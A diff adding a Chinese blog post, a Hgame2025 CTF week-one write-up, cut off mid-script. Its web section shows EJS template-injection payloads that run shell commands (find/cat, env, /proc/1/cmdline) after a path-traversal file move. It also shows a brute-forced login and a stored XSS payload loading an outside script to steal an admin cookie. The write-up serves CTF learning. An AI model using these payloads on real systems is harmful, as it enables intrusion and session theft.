@@ -1,0 +1,805 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/myavatar.jpg">
+  <link rel="icon" href="/img/myavatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="5i1encee">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="依旧菜......">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hgame2025 WP">
+<meta property="og:url" content="http://5i1encee.top/2025/03/02/Hgame2025WP/index.html">
+<meta property="og:site_name" content="5i1encee&#39;s Blog">
+<meta property="og:description" content="依旧菜......">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://5i1encee.top/img/Hgame2025WP/Hgame2025.jpg">
+<meta property="article:published_time" content="2025-03-02T12:58:51.000Z">
+<meta property="article:modified_time" content="2025-03-02T13:19:03.192Z">
+<meta property="article:author" content="5i1encee">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="misc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://5i1encee.top/img/Hgame2025WP/Hgame2025.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Hgame2025 WP - 5i1encee&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"5i1encee.top","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>5i1encee</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Hgame2025WP/Hgame2025.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Hgame2025 WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        5i1encee
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-02 20:58" pubdate>
+          2025年3月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Hgame2025 WP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Hgame2025WP"><a href="#Hgame2025WP" class="headerlink" title="Hgame2025WP"></a>Hgame2025WP</h1><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="TEST-NC"><a href="#TEST-NC" class="headerlink" title="TEST NC"></a>TEST NC</h3><p>连接后 <code>cat flag</code></p>
+<h3 id="从这里开始的序章"><a href="#从这里开始的序章" class="headerlink" title="从这里开始的序章"></a>从这里开始的序章</h3><p>复制粘贴</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>抓包没有发现通信，纯前端 js 的小游戏</p>
+<p>禁用 F12，其他方式打开开发者工具，审计代码，发现大量名称被重命名混淆，未能找到 gameover、alert、flag 等相关有效信息，所以尝试通关游戏获得 flag。</p>
+<p>在 index.js 发现记录地图数据的 <code>map</code> 字段，经比对发现 0x0 为可移动的空地，0x1 为墙，0x2 为敌人可通过的通道，而后发现 <code>_LIFE = 0x5,_SCORE = 0x0;</code> 分别记录生命值和初始分数。而通关的要求是总分达到 10000 且逃离（完成所有关卡 level）所以总的思路是：修改初始分数到达要求，改变地图结构来快速通关（测试发现要吃完一关内所有豆子才能到下一个关卡，只有 0x0 会刷豆子）并防止敌人扣除生命值</p>
+<p>操作：</p>
+<p>利用 Chrome 的 Overrides 功能将 js 代码重载，用本地文件覆盖</p>
+<p>修改 <code>_SCORE = 0x10000;</code> 直接满足分数要求（16^4）</p>
+<p>用脚本生成一个新地图，限制敌人行动、减少豆子刷新，粘贴替换到 js 文件中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">new_maps=[[[<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>)]<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>)]<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">31</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">28</span>):<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">12</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> c &gt;= <span class="hljs-number">10</span> <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-number">17</span> <span class="hljs-keyword">or</span> (c == <span class="hljs-number">10</span> <span class="hljs-keyword">or</span> c == <span class="hljs-number">17</span>) <span class="hljs-keyword">and</span> i &gt; <span class="hljs-number">12</span> <span class="hljs-keyword">and</span> i &lt; <span class="hljs-number">16</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x1&#x27;</span><br>            <span class="hljs-keyword">elif</span> i == <span class="hljs-number">23</span> <span class="hljs-keyword">and</span> c == <span class="hljs-number">13</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x0&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                new_maps[m][i][c] = <span class="hljs-string">&#x27;0x2&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;map.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>front=<span class="hljs-string">&quot;&#123;&#x27;map&#x27;: [&quot;</span><br>behind=<span class="hljs-string">&quot;\n&#x27;wall_color&#x27;: _0x3a9ed7(0x12c),&#x27;goods&#x27;: &#123;&#x27;1,3&#x27;: 0x1,&#x27;26,3&#x27;: 0x1,&#x27;1,23&#x27;: 0x1,&#x27;26,23&#x27;: 0x1&#125;&#125;,\n&quot;</span><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>):<br>    f.write(front)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">31</span>):<br>        f.write(<span class="hljs-string">&#x27;[&#x27;</span>)<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">28</span>):<br>            <span class="hljs-keyword">if</span> c == <span class="hljs-number">27</span>:<br>                f.write(new_maps[m][i][c])<br>                <span class="hljs-keyword">continue</span><br>            f.write(new_maps[m][i][c]+<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">30</span>:<br>            f.write(<span class="hljs-string">&#x27;]&#x27;</span>)<br>        f.write(<span class="hljs-string">&#x27;],&#x27;</span>)<br>    f.write(behind)<br>f.close()<br></code></pre></td></tr></table></figure>
+
+<p>修改完后保存，刷新页面</p>
+<p><img src="/img/Hgame2025WP/UbBBbUvyRojxIax1hBccxvlHnbd.png" srcset="/img/loading.gif" lazyload></p>
+<p>游戏一开始只要吃掉原地的豆子就进入下一关，瞬间刷满通关，获得 flag（简单 base64+ 栅栏 fence 解码）</p>
+<p><img src="/img/Hgame2025WP/Y3ySbNIZMoEK5txChctcZ6XTnbf.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h3><p>审计 app.js 代码，<code>/upload</code> 路由上传文件到 <code>/app/uploads/</code> 目录，没有什么限制，<code>/rename</code> 路由处理重命名，同样几乎没有限制，可以实现目录穿越，相对路径基于 <code>/app/uploads/</code> 目录，<code>/</code> 路由列出 <code>/app/uploads/</code> 目录下的所有文件。使用 express 框架，渲染 ejs 模板返回前端，本地的 <code>/app/public/</code> 目录映射到 <code>/static</code> 路由存放静态资源。</p>
+<p>接下来上靶机，上传任意文件 app.js，使用 BP 向 <code>/rename</code> POST 方法发包，修改文件名 newName 为 <code>../app.js</code> 即可移动文件到 <code>/app/</code> 目录，覆盖原 app.js，但是服务不重启无法利用。同时利用 rename 可以作用于任意目录的文件所以也可以试探文件是否存在，若存在可成功重命名，若不存在则会返回 500 报错。</p>
+<p>考虑靶机为 Nodejs 环境，排除一句话木马，尝试 ejs 模板注入。用 rename 试探到 <code>/app/view/mortis.ejs</code>，将其重命名为 <code>../public/mortis.ejs</code>，下载修改插入</p>
+<p><code>&lt;%= process.mainModule.require(&#39;child_process&#39;).execSync(&#39;find / -type f -name &quot;*flag*&quot; 2&gt;/dev/null -exec cat &#123;&#125; +&#39;) %&gt;</code>，再上传用 rename 移入 <code>/app/view/</code>，刷新，成功执行命令得到返回，但没有找到 flag。</p>
+<p>这里找了好一会，最后在环境变量里终于找到了。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%= <br>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> execSync = process.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">execSync</span>;<br>  <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;env&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>  <span class="hljs-keyword">const</span> procCmdline = <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;cat /proc/1/cmdline&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`环境变量:\n<span class="hljs-subst">$&#123;env&#125;</span>\n\n进程参数:\n<span class="hljs-subst">$&#123;procCmdline&#125;</span>`</span>;<br>&#125;)()<br> %&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/Hgame2025WP/NmUCbDUgtotJtIx6TC1cN1nEnP1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p><img src="/img/Hgame2025WP/C60ObFUJhoAtywx3H3ucTSQKncd.png" srcset="/img/loading.gif" lazyload></p>
+<p>先登录，用户名应该是 shallot，尝试用 BP 爆破，爆出密码 888888</p>
+<p><img src="/img/Hgame2025WP/IAhcbF5lLoY3QTxLPW0czp0Bnl7.png" srcset="/img/loading.gif" lazyload></p>
+<p>随后进入留言板，提交 <code>&lt;script&gt;alert(&#39;123&#39;)&lt;/script&gt;</code> 出现弹窗，似乎没有过滤，可以整存储型 XSS，去获取 admin 的 cookie。所以拿 XSS 网站的 payload <code>&lt;sCRiPt sRC=//xs.pe/0c9&gt;&lt;/sCrIpT&gt;</code> 监听即可。</p>
+<p><img src="/img/Hgame2025WP/Bi4bbrUHIoxldRx2Yf4cuzeKnpd.png" srcset="/img/loading.gif" lazyload></p>
+<p>一开始以为这句“admin 才不会来看你”是反话，是给的提示，后来发现还真没来，被自己无语到了……</p>
+<p>然后突然想起来忘记目录扫描了，一扫扫出来一个 <code>/admin</code></p>
+<p><code>好吧好吧你都这么求我了～admin只好勉为其难的来看看你写了什么～才不是人家想看呢！</code></p>
+<p>……我想这应该行了，然而不知道什么原因还是没有收获。</p>
+<p>后来题目又提供了部分源码，发现思路应该是对的，重新试了一遍，这回成了，得到 admin 的 cookie，访问 <code>/flag</code> 用 BP 修改 cookie 为 admin 的，得到 flag</p>
+<p><img src="/img/Hgame2025WP/QYIlbVcTwoXNRAxaGRgcs3pvn0b.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/Hgame2025WP/FT01b9hU0oVaCMxpuIycHxFcnZc.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Hakuya-Want-A-Girl-Friend"><a href="#Hakuya-Want-A-Girl-Friend" class="headerlink" title="Hakuya Want A Girl Friend"></a>Hakuya Want A Girl Friend</h3><p>附件 hky.txt 全是 16 进制的文本，开头 <code>50 4B 03 04</code> zip 的文件头，寻找文件尾发现 <code>50 4B 05 06 00 00 00 00 02 00 02 00 C1 00 00 00 9D 00 00 00 00 00</code>，后面还有一长串的冗余估计有其他信息隐藏在冗余部分。冗余部分开头 <code>82 60 42 AE</code>，结尾 <code>47 4E 50 89</code>，推测应该是把 png 图片的编码以一个 16 进制为单位倒转顺序了，正常 png 文件头 <code>89 50 4E 47</code>，结尾 <code>AE 42 60 82</code>。</p>
+<p>所以将两部分文本分开，前部分写个 python 转成二进制文件保存为 zip 后缀即可正常打开，里面有密码加密。</p>
+<p>后面部分先写个 python 把 16 进制数的顺序反转，再用上面的同一个程序转成二进制文件保存为 png 后缀即可。</p>
+<p>然而图片中未找到密码，推测文件宽高被修改，利用 crc 校验得正确宽高 <code>576 779</code>，修改获得隐藏的密码。进入压缩包得 flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br>crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;new_hky1.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \<br>            struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span>(crc32 == <span class="hljs-number">0xA672282D</span>):    <span class="hljs-comment">#图片当前CRC</span><br>            <span class="hljs-built_in">print</span>(i, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hex:&#x27;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/Hgame2025WP/IBGJbM15ao7yAxxNaRicVpKBnwr.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Level-314-线性走廊中的双生实体"><a href="#Level-314-线性走廊中的双生实体" class="headerlink" title="Level 314 线性走廊中的双生实体"></a>Level 314 线性走廊中的双生实体</h3><p>附件提供了一个神经网络模块 entity.pt 文件，根据题目的提示加载使用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">entity = torch.jit.load(<span class="hljs-string">&#x27;entity.pt&#x27;</span>)   <span class="hljs-comment">#加载</span><br><span class="hljs-comment">#准备一个形状为[█，██]的张量，确保其符合“█/█稳定态”条件。</span><br>output = entity(input_tensor)   <span class="hljs-comment">#将张量输入实体以尝试激活信息</span><br></code></pre></td></tr></table></figure>
+
+<p>先是随便准备了一个张量 tensor([4,14])，报错，意识到提示给的是“形状”，然后搞了一个形状[4,14]的张量，报错</p>
+<p><code>RuntimeError: mat1 and mat2 shapes cannot be multiplied (4x14 and 10x10)</code>，说明内部有矩阵乘法运算且另一个矩阵形状为[10,10]。所以换一个形状[4,10]的张量，<code>print(output)</code> 就有正常输出了，但由于一开始我是 0 到 1 线性取值组成的张量，均值很小，所以没有看到任何有用信息。</p>
+<p>索性开始调试，在 <code>output = entity(input_tensor)</code> 处打断点，查看 entity 的信息。</p>
+<p>顶层的 forward 推理部分如下，<code>linear1 -&gt; security -&gt; relu -&gt; linear2</code></p>
+<p><img src="/img/Hgame2025WP/Q2KUbsSQ0oBWWCxX6g8cb4Qanaf.png" srcset="/img/loading.gif" lazyload></p>
+<p>linear1 和 linear2 均是使用 <code>torch.nn.functional.linear(input,weight,bias)</code> 做线性变换，<code>output=input*weight+bias</code>，分别使用了形状(10,10)的 weight 和(10,)的 bias、形状(1,10)的 weight 和(1,)的 bias。</p>
+<p><img src="/img/Hgame2025WP/K3TFb1wkXofsMoxXJa4cAx5inQb.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/Hgame2025WP/KgynblxjPo2ggnx96LccdhlanAh.png" srcset="/img/loading.gif" lazyload></p>
+<p>security 的 forward 部分</p>
+<p>当满足 <code>torch.allclose(torch.mean(x0), torch.tensor(0.31415000000000004), rtol=1.0000000000000001e-05, atol=0.0001)</code> 时会从 flag 数组中逐字读取并与 85 异或，拼接输出。其中 <code>torch.mean(x0)</code> 为对张量内所有值取平均（未指定维度），<code>torch.allclose(A,B,rtol,atol)</code> 比较 A、B 两个元素是否接近，|A-B| &lt;&#x3D; atol+rtol*|B| 则为 true。所以综上，要获得 flag，就要使输入的张量 x 经过 linear1 处理后取平均极度接近于 0.31415。（估计这里就是题目暗示的“周率”、和“十方境界”了吧，π*10^-1）</p>
+<p>此外当满足 <code>torch.gt(torch.mean(x),0.5)</code> 时，也就是取平均后大于 0.5 时拼接、输出 fake_flag。（此处的 bool()应该不是 python 自带的 bool 函数，如果是的话那么这条判断应该始终为 true，也就不会出现我一开始的情况了吧，一开始取值太小，又不接近 0.31415，就什么有用的都没）</p>
+<p><img src="/img/Hgame2025WP/MVEPbeJI4o7GCOxjYPScVyO3n3c.png" srcset="/img/loading.gif" lazyload></p>
+<p>分析完成后写脚本跑出正确的张量输入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br>target_mean = <span class="hljs-number">0.31415000000000004</span><br><br>weight = torch.tensor([<br>    [-<span class="hljs-number">0.1905</span>, -<span class="hljs-number">0.2279</span>, -<span class="hljs-number">0.1038</span>, <span class="hljs-number">0.2425</span>, <span class="hljs-number">0.1687</span>, -<span class="hljs-number">0.0876</span>, -<span class="hljs-number">0.0443</span>, <span class="hljs-number">0.1849</span>,<br>               <span class="hljs-number">0.1420</span>,  <span class="hljs-number">0.2552</span>],<br>             [ <span class="hljs-number">0.1606</span>, -<span class="hljs-number">0.2255</span>,  <span class="hljs-number">0.2935</span>, -<span class="hljs-number">0.1483</span>,  <span class="hljs-number">0.0447</span>, -<span class="hljs-number">0.0528</span>,  <span class="hljs-number">0.3090</span>, -<span class="hljs-number">0.0193</span>,<br>              -<span class="hljs-number">0.0874</span>, -<span class="hljs-number">0.1935</span>],<br>             [-<span class="hljs-number">0.2987</span>, -<span class="hljs-number">0.3123</span>,  <span class="hljs-number">0.1831</span>,  <span class="hljs-number">0.2289</span>, -<span class="hljs-number">0.1729</span>,  <span class="hljs-number">0.0225</span>, -<span class="hljs-number">0.1234</span>,  <span class="hljs-number">0.1704</span>,<br>               <span class="hljs-number">0.2700</span>,  <span class="hljs-number">0.1911</span>],<br>             [ <span class="hljs-number">0.1425</span>,  <span class="hljs-number">0.0841</span>, -<span class="hljs-number">0.2787</span>, -<span class="hljs-number">0.0964</span>, -<span class="hljs-number">0.2263</span>, -<span class="hljs-number">0.2821</span>,  <span class="hljs-number">0.0173</span>,  <span class="hljs-number">0.0279</span>,<br>               <span class="hljs-number">0.2843</span>,  <span class="hljs-number">0.1745</span>],<br>             [ <span class="hljs-number">0.1492</span>, -<span class="hljs-number">0.1212</span>, -<span class="hljs-number">0.3122</span>, -<span class="hljs-number">0.0605</span>,  <span class="hljs-number">0.2146</span>, -<span class="hljs-number">0.2049</span>, -<span class="hljs-number">0.2629</span>,  <span class="hljs-number">0.2081</span>,<br>               <span class="hljs-number">0.2239</span>,  <span class="hljs-number">0.0339</span>],<br>             [ <span class="hljs-number">0.3045</span>, -<span class="hljs-number">0.3089</span>, -<span class="hljs-number">0.0101</span>,  <span class="hljs-number">0.0076</span>,  <span class="hljs-number">0.1810</span>,  <span class="hljs-number">0.2333</span>, -<span class="hljs-number">0.0124</span>,  <span class="hljs-number">0.0553</span>,<br>               <span class="hljs-number">0.1279</span>, -<span class="hljs-number">0.2548</span>],<br>             [-<span class="hljs-number">0.2894</span>,  <span class="hljs-number">0.0390</span>, -<span class="hljs-number">0.2061</span>,  